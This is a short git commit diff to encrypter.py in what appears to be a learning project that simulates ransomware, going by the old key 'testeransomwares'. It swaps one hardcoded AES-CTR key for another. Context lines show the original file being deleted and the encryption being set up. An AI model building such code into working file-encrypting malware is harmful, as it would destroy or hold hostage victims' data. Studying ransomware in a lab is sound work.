602897241bdce834a5902135f608856504926203
cyber-fat <marcelomarques@duck.com>
2024-12-22 16:35:34 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -11,7 +11,7 @@ file.close()
 os.remove(file_name)
 
 ## chave de criptografia
-key = b"testeransomwares"
+key = b"laconchadeloreta@2"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
